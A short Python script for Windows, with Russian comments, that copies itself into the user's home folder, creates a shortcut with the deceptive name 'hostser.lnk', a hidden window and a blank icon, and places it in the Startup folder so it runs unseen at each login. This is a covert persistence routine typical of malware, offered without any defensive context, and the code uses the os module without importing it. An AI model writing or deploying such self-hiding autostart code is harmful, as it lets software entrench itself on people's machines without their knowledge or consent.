import shutil
import winshell
import win32con
current_program = os.path.abspath(__file__)
user_folder = os.path.expanduser("~")
copy_folder = os.path.join(user_folder, "MyProgram")
os.makedirs(copy_folder, exist_ok=True)
shutil.copy(current_program, copy_folder)
shortcut_name = "hostser.lnk"
shortcut_path = os.path.join(user_folder, shortcut_name)
with winshell.shortcut(shortcut_path) as shortcut:
    shortcut.path = os.path.join(copy_folder, os.path.basename(current_program))
    shortcut.show_cmd = win32con.SW_HIDE  # Скрываем ярлык
    shortcut.icon = (None, 0)  # Задаем значение None для иконки
startup_folder = winshell.startup()
startup_shortcut_path = os.path.join(startup_folder, os.path.basename(shortcut_path))
shutil.copy(shortcut_path, startup_shortcut_path)
